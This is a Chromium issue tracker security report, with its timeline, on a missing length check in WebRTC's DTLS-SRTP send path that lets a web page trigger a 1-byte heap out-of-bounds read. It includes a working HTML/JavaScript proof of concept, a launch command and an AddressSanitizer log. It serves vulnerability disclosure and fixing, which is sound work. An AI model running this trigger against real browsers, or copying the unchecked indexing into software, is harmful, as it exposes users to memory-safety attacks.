# Missing Payload Length Check in DTLS-SRTP Send Path Leads to Heap Out-of-Bounds Read in the Renderer Process

| Field | Value |
|-------|-------|
| **Issue ID** | [485683099](https://issues.chromium.org/issues/485683099) |
| **Status** | Verified |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Internals>Core |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | ph...@google.com |
| **Created** | 2026-02-19 |
| **Bounty** | $2,000.00 |

## Description

## Missing Payload Length Check in DTLS-SRTP Send Path Leads to Heap Out-of-Bounds Read in the Renderer Process

## Summary

The `DatagramConnectionInternal::SendSinglePacket` function in WebRTC's datagram connection implementation unconditionally indexes into the packet payload at offsets 0 and 1 to classify packets as RTP or RTCP when the wire protocol is DTLS-SRTP and SRTP is active, without first verifying that the payload contains at least 2 bytes. Because the Blink-side `RtcTransport.sendPackets()` API accepts arbitrary `AllowSharedBufferSource` data including zero-length buffers, a web page can send a 1-byte payload through the full call chain, triggering a heap buffer overflow read of 1 byte immediately past the allocation when `SendSinglePacket` accesses `packet.payload[1]`. This occurs on the network thread of the renderer process and was confirmed with AddressSanitizer.

## Bisect

The vulnerable code was introduced in WebRTC commit `b70b78f732de` ("Allow DatagramConnection (ie the RtcTransport web API) to send and receive real SRTP/SCTP"), authored by Tony Herre on 2025-11-20 and reviewed at <https://webrtc-review.googlesource.com/c/src/+/421782> with Cr-Commit-Position `refs/heads/main@{#46240}`. This commit was rolled into Chromium via `f7571e890e98` ("Roll WebRTC from 9d5809a28521 to b70b78f732de (2 revisions)") on the same date.

Prior to this commit, `SendSinglePacket` wrapped the entire payload inside a synthetic `RtpPacket` using `rtp_packet.SetPayload(packet.payload)` and sent it through `SendRtpPacket`, which never directly indexed into the raw payload bytes. The refactored code replaced this with a classification scheme that reads `packet.payload[0]` through `IsRtpOrRtcpPacket` to determine whether the packet looks like RTP/RTCP based on the version bits, and then reads `packet.payload[1]` through `ParsePayloadType` and `PayloadTypeIsReservedForRtcp` to distinguish RTP from RTCP. Neither access is preceded by a bounds check on `packet.payload.size()`.

## Root Cause

The `RtcTransport` Web API, gated behind the `RTCRtpTransport` runtime feature flag (currently in `test` status), exposes a `sendPackets` method that accepts an array of `RtcSendPacketParameters` dictionaries. Each dictionary contains a `required AllowSharedBufferSource data` field that maps to an `ArrayBuffer` or `ArrayBufferView` of any size, including zero bytes:

```
// third_party/blink/renderer/modules/peerconnection/rtc_transport/rtc_transport.idl
dictionary RtcSendPacketParameters {
  long long id;
  required AllowSharedBufferSource data;
  DOMHighResTimeStamp desiredSendTime;
};

```

When JavaScript calls `transport.sendPackets()`, the Blink implementation in `RtcTransport::sendPackets` converts each `AllowSharedBufferSource` into a `Vector<uint8_t>` by calling `RtcTransportBufferSourceAsByteSpan`, which returns the raw byte span without any minimum length validation:

```
// third_party/blink/renderer/modules/peerconnection/rtc_transport/rtc_transport.cc
void RtcTransport::sendPackets(
    HeapVector<Member<RtcSendPacketParameters>> packets) {
  // ...
  for (const auto& packet : packets) {
    packet_payloads->emplace_back(
        RtcTransportBufferSourceAsByteSpan(*packet->data()));
  }
  async_datagram_connection_->SendPackets(std::move(packet_payloads));
}

```

The payload vectors are then posted to the network thread via `AsyncDatagramConnectionImpl::SendPackets`, which constructs `PacketSendParameters` with an `ArrayView<const uint8_t> payload` pointing at the vector data. No size check exists at this stage either:

```
// third_party/blink/renderer/modules/peerconnection/rtc_transport/rtc_transport.cc
void SendPackets(
    std::unique_ptr<Vector<Vector<uint8_t>>> packet_payloads) override {
  PostCrossThreadTask(
      *RtcTransportDependencies::NetworkTaskRunner(), FROM_HERE,
      CrossThreadBindOnce(
          [](/* ... */) {
            for (const Vector<uint8_t>& payload : *packet_payloads) {
              send_params.push_back(PacketSendParameters{.payload = payload});
            }
            datagram_connection->SendPackets(send_params);
          }, /* ... */));
}

```

On the network thread, `DatagramConnectionInternal::SendSinglePacket` processes each packet. When the wire protocol is `kDtlsSrtp` (the default) and SRTP has been negotiated, the function enters the classification branch that directly indexes into the payload without any bounds check:

```
// third_party/webrtc/pc/datagram_connection_internal.cc
void DatagramConnectionInternal::SendSinglePacket(
    const PacketSendParameters& packet, bool last_packet_in_batch) {
  // ...
  if (!dtls_srtp_transport_->IsSrtpActive()) {
    RTC_LOG(LS_ERROR) << "Dropping packet on non-active SRTP connection";
    DispatchSendOutcome(packet.id, Observer::SendOutcome::Status::kNotSent);
    return;
  }

  if (IsRtpOrRtcpPacket(packet.payload[0])) {              // OOB if size == 0
    CopyOnWriteBuffer buffer(packet.payload.data(), packet.payload.size(),
                             kMaxRtpPacketLen);
    uint8_t send_flags = PF_SRTP_BYPASS;
    bool send_successful;
    if (PayloadTypeIsReservedForRtcp(
            ParsePayloadType(packet.payload[1]))) {         // OOB if size <= 1
      send_successful =
          dtls_srtp_transport_->SendRtcpPacket(&buffer, options, send_flags);
    } else {
      send_successful =
          dtls_srtp_transport_->SendRtpPacket(&buffer, options, send_flags);
    }
    // ...
  }
}

```

The three helper functions used for classification are defined in the same file:

```
// third_party/webrtc/pc/datagram_connection_internal.cc
bool IsRtpOrRtcpPacket(uint8_t first_byte) {
  return (first_byte & 0xc0) == 0x80;
}

uint8_t ParsePayloadType(uint8_t second_byte) {
  return second_byte & 0x7F;
}

bool PayloadTypeIsReservedForRtcp(uint8_t payload_type) {
  return 64 <= payload_type && payload_type < 96;
}

```

These functions are safe in isolation as they accept `uint8_t` by value, but the calling code passes them values obtained by directly indexing into the payload without first checking `packet.payload.size() >= 2`.

When a 1-byte payload with value `0x80` is sent, `IsRtpOrRtcpPacket(0x80)` evaluates to `true` because `(0x80 & 0xC0) == 0x80`. Execution then proceeds to `packet.payload[1]`, which reads one byte past the end of the 1-byte heap allocation. The read value determines whether the packet is routed to `SendRtcpPacket` or `SendRtpPacket`, meaning the out-of-bounds byte influences control flow. A 0-byte payload triggers an even earlier out-of-bounds read at `packet.payload[0]`.

The complete absence of length validation at every layer of the call chain (IDL binding, Blink conversion, cross-thread dispatch, and WebRTC processing) means the fix must be applied at the point of consumption in `SendSinglePacket`, adding a guard such as `if (packet.payload.size() < 2) return;` before the `IsRtpOrRtcpPacket` check.

## Reproduce

The following proof of concept creates two `RtcTransport` instances within the same page, exchanges ICE candidates and DTLS fingerprints between them to establish a DTLS-SRTP session, waits for the transport to become writable (confirming SRTP is active), and then sends a 1-byte payload `[0x80]` that triggers the out-of-bounds read on `packet.payload[1]`.

Save the following as `poc_rtctransport_oob.html` and run with:

```
ASAN_OPTIONS=detect_odr_violation=0:abort_on_error=0:log_path=/tmp/asan_rtctransport_oob \
/path/to/asan-chrome \
  --enable-blink-features=RTCRtpTransport \
  --no-sandbox \
  "file:///path/to/poc_rtctransport_oob.html"

```
```
<!DOCTYPE html>
<html>
<head>
<title>OOB read in SendSinglePacket (DTLS-SRTP path)</title>
</head>
<body>
<pre id="log"></pre>
<script>
const logDiv = document.getElementById('log');
function log(msg) {
  logDiv.textContent += msg + '\n';
  console.log(msg);
}

async function triggerOOB() {
  log('[*] OOB read PoC: SendSinglePacket short payload on DTLS-SRTP path');
  log('');

  log('[1] Creating RtcTransport A (iceControlling: true) ...');
  let transportA;
  try {
    transportA = new RtcTransport({
      iceControlling: true,
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
    });
  } catch (e) {
    log('FATAL: Cannot create RtcTransport A: ' + e);
    log('Ensure Chrome is launched with --enable-blink-features=RTCRtpTransport');
    return;
  }
  log('    Transport A created OK');

  log('[2] Creating RtcTransport B (iceControlling: false) ...');
  let transportB;
  try {
    transportB = new RtcTransport({
      iceControlling: false,
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
    });
  } catch (e) {
    log('FATAL: Cannot create RtcTransport B: ' + e);
    return;
  }
  log('    Transport B created OK');

  log('[3] Setting up ICE candidate exchange ...');
  transportA.onicecandidate = (event) => {
    const c = event.candidate;
    if (!c) return;
    log('    A -> B candidate: ' + c.address + ':' + c.port + ' (' + c.type + ')');
    try {
      transportB.addRemoteCandidate({
        address: c.address, port: c.port,
        usernameFragment: c.usernameFragment,
        password: c.password, type: c.type,
      });
    } catch (e) {}
  };
  transportB.onicecandidate = (event) => {
    const c = event.candidate;
    if (!c) return;
    log('    B -> A candidate: ' + c.address + ':' + c.port + ' (' + c.type + ')');
    try {
      transportA.addRemoteCandidate({
        address: c.address, port: c.port,
        usernameFragment: c.usernameFragment,
        password: c.password, type: c.type,
      });
    } catch (e) {}
  };

  log('[4] Exchanging DTLS parameters ...');
  await new Promise(r => setTimeout(r, 500));

  const fpA = transportA.fingerprint;
  const algA = transportA.fingerprintDigestAlgorithm;
  const fpB = transportB.fingerprint;
  const algB = transportB.fingerprintDigestAlgorithm;
  log('    A fingerprint alg: ' + algA + ', len: ' + (fpA ? fpA.byteLength : 'null'));
  log('    B fingerprint alg: ' + algB + ', len: ' + (fpB ? fpB.byteLength : 'null'));

  if (!fpA || !fpB) { log('FATAL: Fingerprints not available'); return; }

  transportA.setRemoteDtlsParameters({
    sslRole: 'server', fingerprintDigestAlgorithm: algB, fingerprint: fpB,
  });
  log('    Set remote DTLS params on A OK');

  transportB.setRemoteDtlsParameters({
    sslRole: 'client', fingerprintDigestAlgorithm: algA, fingerprint: fpA,
  });
  log('    Set remote DTLS params on B OK');

  log('[5] Waiting for transport to become writable ...');
  let writable = false;
  await new Promise((resolve) => {
    transportA.onwritablechange = async () => {
      const w = await transportA.writable();
      log('    A writablechange event, writable=' + w);
      if (w && !writable) { writable = true; resolve(); }
    };
    const interval = setInterval(async () => {
      try {
        const wA = await transportA.writable();
        if (wA && !writable) { writable = true; clearInterval(interval); resolve(); }
      } catch (e) {}
    }, 200);
    setTimeout(() => {
      clearInterval(interval);
      if (!writable) { log('    Writable timeout after 15s'); resolve(); }
    }, 15000);
  });

  if (writable) { log('    Transport A is writable!'); }

  log('');
  log('[6] Sending 1-byte payload [0x80] to trigger OOB read on payload[1]');
  try {
    transportA.sendPackets([{ id: 1, data: new Uint8Array([0x80]) }]);
    log('    sendPackets() returned (OOB read happens async on network thread)');
  } catch (e) {
    log('    sendPackets error: ' + e);
  }

  log('[7] Sending 0-byte payload to trigger OOB read on payload[0]');
  try {
    transportA.sendPackets([{ id: 2, data: new ArrayBuffer(0) }]);
    log('    sendPackets() returned (OOB read happens async on network thread)');
  } catch (e) {
    log('    sendPackets error: ' + e);
  }

  log('');
  log('[*] Check terminal / ASAN log for heap-buffer-overflow report');
  await new Promise(r => setTimeout(r, 3000));
  log('[*] PoC complete');
}

triggerOOB().catch(e => log('Unhandled: ' + e));
</script>
</body>
</html>

```

Execution output from the Chromium ASAN build confirms that ICE connectivity is established, the DTLS-SRTP handshake completes, and the malicious packets are dispatched:

```
[*] OOB read PoC: SendSinglePacket short payload on DTLS-SRTP path

[1] Creating RtcTransport A (iceControlling: true) ...
    Transport A created OK
[2] Creating RtcTransport B (iceControlling: false) ...
    Transport B created OK
[3] Setting up ICE candidate exchange ...
[4] Exchanging DTLS parameters ...
    A -> B candidate: 172.16.0.1:47543 (host)
    A -> B candidate: 172.28.1.1:38084 (host)
    A -> B candidate: 172.17.0.1:57639 (host)
    A -> B candidate: 192.168.3.98:57658 (host)
    B -> A candidate: 172.16.0.1:58099 (host)
    B -> A candidate: 172.28.1.1:58889 (host)
    B -> A candidate: 172.17.0.1:34448 (host)
    B -> A candidate: 192.168.3.98:53103 (host)
    A fingerprint alg: sha-256, len: 32
    B fingerprint alg: sha-256, len: 32
    Set remote DTLS params on A OK
    Set remote DTLS params on B OK
[5] Waiting for transport to become writable ...
    A writablechange event, writable=true
    Transport A is writable!

[6] Sending 1-byte payload [0x80] to trigger OOB read on payload[1]
    sendPackets() returned (OOB read happens async on network thread)
[7] Sending 0-byte payload to trigger OOB read on payload[0]
    sendPackets() returned (OOB read happens async on network thread)

[*] Check terminal / ASAN log for heap-buffer-overflow report
[*] PoC complete

```

The AddressSanitizer log confirms a heap buffer overflow read of 1 byte immediately past the 1-byte allocation, triggered on the network thread by the 1-byte `[0x80]` payload:

```
=================================================================
==41852==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7bfdd8945bf1 at pc 0x7fde3ddf9542 bp 0x7bd8dece2210 sp 0x7bd8dece2208
READ of size 1 at 0x7bfdd8945bf1 thread T9 (RtcTransport_ne)
    #0 0x7fde3ddf9541 in webrtc::DatagramConnectionInternal::SendSinglePacket(webrtc::DatagramConnection::PacketSendParameters const&, bool) third_party/webrtc/pc/datagram_connection_internal.cc:304:55
    #1 0x7fde3ddf8c73 in webrtc::DatagramConnectionInternal::SendPackets(webrtc::ArrayView<webrtc::DatagramConnection::PacketSendParameters, -4711l>) third_party/webrtc/pc/datagram_connection_internal.cc:260:5
    #2 0x7fddeea296a7 in blink::(anonymous namespace)::AsyncDatagramConnectionImpl::SendPackets(...) third_party/blink/renderer/modules/peerconnection/rtc_transport/rtc_transport.cc:201:36
    #3 0x7fde56f5ce92 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #4 0x7fde56fde37e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #5 0x7fde56fdd356 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #6 0x7fde56dff601 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #7 0x7fde56fdf9f8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #8 0x7fde56ec7212 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #9 0x7fde57075a42 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #10 0x7fde57076012 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #11 0x7fde570da09c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #12 0x55f736645476 in asan_thread_start(void*) asan_interceptors.cpp

0x7bfdd8945bf1 is located 0 bytes after 1-byte region [0x7bfdd8945bf0,0x7bfdd8945bf1)
allocated by thread T0 (chrome) here:
    #0 0x55f736647b84 in malloc (/home/test/chromium/src/out/asan-release/chrome+0x67d4b84)
    #1 0x7fde57b165df in partition_alloc::PartitionRoot::Alloc<(partition_alloc::internal::AllocFlags)0>(unsigned long, char const*) base/allocator/partition_allocator/src/partition_alloc/partition_root.h:2283:49
    #2 0x7fdded508a21 in blink::VectorBufferBase<unsigned char, blink::PartitionAllocator>::AllocateBufferNoBarrier(unsigned int) third_party/blink/renderer/platform/wtf/allocator/partition_allocator.h:42:9
    #3 0x7fddeea1ccc1 in blink::Vector<unsigned char, 0u, blink::PartitionAllocator>::Vector<base::span<unsigned char, 18446744073709551615ul, unsigned char*>, std::__Cr::identity>(T&&, std::__Cr::identity) third_party/blink/renderer/platform/wtf/vector.h:472:5
    #4 0x7fddeea1a5ce in blink::RtcTransport::sendPackets(...) third_party/blink/renderer/platform/wtf/construct_traits.h:29:9
    #5 0x7fddecef22b5 in blink::(anonymous namespace)::v8_rtc_transport::SendPacketsOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/modules/v8/v8_rtc_transport.cc:288:17

Thread T9 (RtcTransport_ne) created by T0 (chrome) here:
    #0 0x55f73662b231 in pthread_create
    #1 0x7fde570d975c in base::(anonymous namespace)::CreateThread(...) base/threading/platform_thread_posix.cc:153:13
    #2 0x7fde570745c0 in base::Thread::StartWithOptions(base::Thread::Options) base/threading/thread.cc:228:26
    #3 0x7fddeea3a008 in blink::RtcTransportProcessWideDeps::RtcTransportProcessWideDeps() third_party/blink/renderer/modules/peerconnection/rtc_transport/rtc_transport_dependencies.cc:77:21
    #4 0x7fddeea164cf in blink::RtcTransport::Create(blink::ExecutionContext*, blink::RtcTransportConfig const*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_transport/rtc_transport.cc:256:3
    #5 0x7fddecef09cc in blink::(anonymous namespace)::v8_rtc_transport::ConstructorCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/modules/v8/v8_rtc_transport.cc:213:23

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/webrtc/pc/datagram_connection_internal.cc:304:55 in webrtc::DatagramConnectionInternal::SendSinglePacket(webrtc::DatagramConnection::PacketSendParameters const&, bool)
Shadow bytes around the buggy address:
  0x7bfdd8945b00: f7 fa 00 fa f7 fa 00 fa f7 fa 00 00
  0x7bfdd8945b80: f7 fa fd fa f7 fa 00 00 f7 fa 00 00 f7 fa[01]fa
  0x7bfdd8945c00: f7 fa 00 00 f7 fa fd fa f7 fa 00 00 f7 fa fd fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Poisoned by user:        f7

==41852==ABORTING

```

The shadow byte `[01]` at the buggy address confirms that only 1 byte of the 8-byte aligned shadow region was addressable, matching the 1-byte allocation from `sendPackets`. The read at offset 1 lands in the heap redzone (`fa`). The stack trace confirms the complete exploitation path: JavaScript calls `sendPackets` which allocates a 1-byte `Vector<uint8_t>`, the vector is posted to the network thread as a `PacketSendParameters` with a 1-byte `ArrayView` payload, and `SendSinglePacket` reads past the end of this allocation at offset 1. The read byte determines whether the packet is routed to `SendRtcpPacket` or `SendRtpPacket`, meaning an adjacent heap value directly influences control flow in the renderer process.

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4859542424715264.

### ma...@google.com (2026-02-19)

Security shepherd: S1 for renderer UAF, but I assume this can be Impact\_None given the feature is disabled and the status is "test". herre@, could you PTAL and confirm that this isn't currently enabled for any Chrome Stable users be default (including via expirments and Origin Trials)?

### st...@webrtc.org (2026-02-20)

philipel@google.com could take a look at this I think. My understanding is that this is indeed not enabled for any Stable users.

### 24...@project.gserviceaccount.com (2026-02-20)

Detailed Report: https://clusterfuzz.com/testcase?key=4859542424715264

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x767271593c21
Crash State:
  webrtc::DatagramConnectionInternal::SendSinglePacket
  webrtc::DatagramConnectionInternal::SendPackets
  base::TaskAnnotator::RunTaskImpl
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1553878:1553882

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4859542424715264

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### 24...@project.gserviceaccount.com (2026-02-20)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2026-03-05)

ClusterFuzz testcase 4859542424715264 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1594077:1594079

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### je...@gmail.com (2026-03-08)

The ASAN heap-buffer-overflow report for this vulnerability can no longer be reproduced on Chromium builds at or after 2026-03-03 due to an upstream WebRTC change (commit 1d1753600d, "Alias ArrayView to be std::span"). Prior to this commit, webrtc::ArrayView was a custom class whose operator[] performed no bounds checking in release/ASAN configurations, allowing the out-of-bounds read at datagram\_connection\_internal.cc:294,304 to proceed to the actual memory access, which ASAN then intercepted and reported.

After this commit, ArrayView became a type alias for std::span, and Chromium unconditionally builds with \_LIBCPP\_HARDENING\_MODE\_EXTENSIVE (build/config/compiler/BUILD.gn:2034), which adds a bounds check (\_LIBCPP\_ASSERT\_VALID\_ELEMENT\_ACCESS) inside std::span::operator[]. This assertion traps (SIGABRT) before the out-of-bounds memory access occurs, preempting ASAN's shadow memory detection. The underlying vulnerability remains unfixed: SendSinglePacket still indexes into packet.payload at offsets 0 and 1 without verifying packet.payload.size() >= 2.

Of course, I think this can also be seen as Fix.

### he...@google.com (2026-03-17)

FYI underlying issue was also fixed in <https://webrtc-review.git.corp.google.com/c/src/+/454280>

### sp...@google.com (2026-03-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
Baseline user information disclosure


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-12)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485683099)*
